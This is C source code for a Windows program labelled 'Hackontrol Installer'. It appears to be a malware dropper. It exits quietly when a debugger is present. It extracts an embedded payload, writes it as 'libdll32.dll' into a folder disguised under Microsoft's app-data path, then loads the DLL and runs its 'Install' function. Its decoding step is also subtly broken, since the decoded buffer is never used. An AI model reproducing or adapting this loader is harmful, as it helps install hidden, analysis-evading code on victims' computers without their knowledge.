#include <stdio.h>
#include <Windows.h>
#include <ShlObj_core.h>
#include "resource.h"

#define PATH L"%LOCALAPPDATA%\\Microsoft\\InstallService"
#define FILE L"libdll32.dll"
#define FUNCTION "Install"

typedef void(__stdcall* RUNDLL32FUNCTION) (HWND window, HINSTANCE instance, LPSTR argument, int command);

typedef struct {
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
} *PPEB;

static void displayError(const LPCWSTR function, const DWORD code, const HANDLE heap) {
	LPWSTR message;

	if(!FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_MAX_WIDTH_MASK, NULL, code, MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), (LPWSTR) &message, 0, NULL)) {
		return;
	}

	LPCWSTR format = L"%ws() failed. Error code: 0x%08X Message:\n%ws";
	int length = _scwprintf(format, function, code, message);

	if(length < 1) {
		LocalFree(message);
		return;
	}

	LPWSTR buffer = HeapAlloc(heap, 0, (length + 1) * sizeof(WCHAR));

	if(!buffer) {
		LocalFree(message);
		return;
	}

	length = swprintf_s(buffer, length + 1, format, function, code, message);
	LocalFree(message);

	if(length == -1) {
		HeapFree(heap, 0, buffer);
		return;
	}

	buffer[length] = 0;
	MessageBoxW(NULL, buffer, L"Hackontrol Installer Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
	HeapFree(heap, 0, buffer);
}

int main(int argc, char** argv) {
	PPEB block = (PPEB) __readgsqword(0x60);

	if(!block || block->BeingDebugged) {
		return 0;
	}

	HANDLE heap = GetProcessHeap();

	if(!heap) {
		MessageBoxW(NULL, L"Error: No process heap available", L"Hackontrol Installer Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		return 1;
	}

	DWORD length = ExpandEnvironmentStringsW(PATH, NULL, 0);

	if(!length) {
		displayError(L"ExpandEnvironmentStringsW", GetLastError(), heap);
		return 1;
	}

	printf("Finding resource\n");
	HRSRC handle = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

	if(!handle) {
		displayError(L"FindResourceW", GetLastError(), heap);
		return 1;
	}

	DWORD size = SizeofResource(NULL, handle);

	if(!size) {
		displayError(L"SizeofResource", GetLastError(), heap);
		return 1;
	}

	printf("Resource size: %lu bytes\n", size);
	HGLOBAL resource = LoadResource(NULL, handle);

	if(!resource) {
		displayError(L"LoadResource", GetLastError(), heap);
		return 1;
	}

	PBYTE data = LockResource(resource);

	if(!data) {
		displayError(L"LockResource", GetLastError(), heap);
		return 1;
	}

	LPWSTR pathHome = HeapAlloc(heap, 0, sizeof(WCHAR) * length);

	if(!pathHome) {
		displayError(L"HeapAlloc", ERROR_FUNCTION_FAILED, heap);
		return 1;
	}

	int codeExit = 1;

	if(!ExpandEnvironmentStringsW(PATH, pathHome, length)) {
		displayError(L"ExpandEnvironmentStringsW", GetLastError(), heap);
		goto freePathHome;
	}

	LPWSTR pathFile = HeapAlloc(heap, 0, sizeof(WCHAR) * length + sizeof(FILE));

	if(!pathFile) {
		displayError(L"HeapAlloc", ERROR_FUNCTION_FAILED, heap);
		goto freePathHome;
	}

	memcpy(pathFile, pathHome, sizeof(WCHAR) * (length - 1));
	memcpy(pathFile + length, FILE, sizeof(FILE));
	pathFile[length - 1] = L'\\';
	pathFile[length + sizeof(FILE) / sizeof(WCHAR) - 1] = 0;
	PBYTE buffer = HeapAlloc(heap, 0, size);

	if(!buffer) {
		displayError(L"HeapAlloc", ERROR_FUNCTION_FAILED, heap);
		goto freePathFile;
	}

	for(length = 0; length < size; length++) {
		buffer[length] = (data[length] - 18) % 0xFF;
	}

	printf("Create directory\n");
	length = SHCreateDirectoryExW(NULL, pathHome, NULL);

	if(length == ERROR_ALREADY_EXISTS || length == ERROR_FILE_EXISTS) {
		length = GetFileAttributesW(pathHome);

		if(length == INVALID_FILE_ATTRIBUTES) {
			displayError(L"GetFileAttributesW", GetLastError(), heap);
			goto freeBuffer;
		}

		if(length & FILE_ATTRIBUTE_DIRECTORY) {
			goto directoryExists;
		}

		printf("Directory name conflict\n");

		if(!DeleteFileW(pathHome)) {
			displayError(L"DeleteFileW", GetLastError(), heap);
			goto freeBuffer;
		}

		length = SHCreateDirectoryExW(NULL, pathHome, NULL);

		if(length != ERROR_SUCCESS) {
			displayError(L"SHCreateDirectoryExW", length, heap);
			goto freeBuffer;
		}
	} else if(length != ERROR_SUCCESS) {
		displayError(L"SHCreateDirectoryExW", length, heap);
		goto freeBuffer;
	}
directoryExists:;
	HANDLE file = CreateFileW(pathFile, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if(file == INVALID_HANDLE_VALUE) {
		displayError(L"CreateFileW", GetLastError(), heap);
		goto freeBuffer;
	}

	if(!WriteFile(file, data, (DWORD) size, &length, NULL)) {
		displayError(L"WriteFile", GetLastError(), heap);
		CloseHandle(file);
		goto freeBuffer;
	}

	CloseHandle(file);
	HMODULE executable = LoadLibraryW(pathFile);

	if(!executable) {
		displayError(L"LoadLibraryW", GetLastError(), heap);
		goto freeBuffer;
	}

	RUNDLL32FUNCTION function = (RUNDLL32FUNCTION) GetProcAddress(executable, FUNCTION);

	if(!function) {
		displayError(L"GetProcAddress", GetLastError(), heap);
		goto freeBuffer;
	}

	function(NULL, NULL, NULL, 0);
	printf("Finished\n");
	codeExit = 0;
freeBuffer:
	HeapFree(heap, 0, buffer);
freePathFile:
	HeapFree(heap, 0, pathFile);
freePathHome:
	HeapFree(heap, 0, pathHome);
	return codeExit;
}
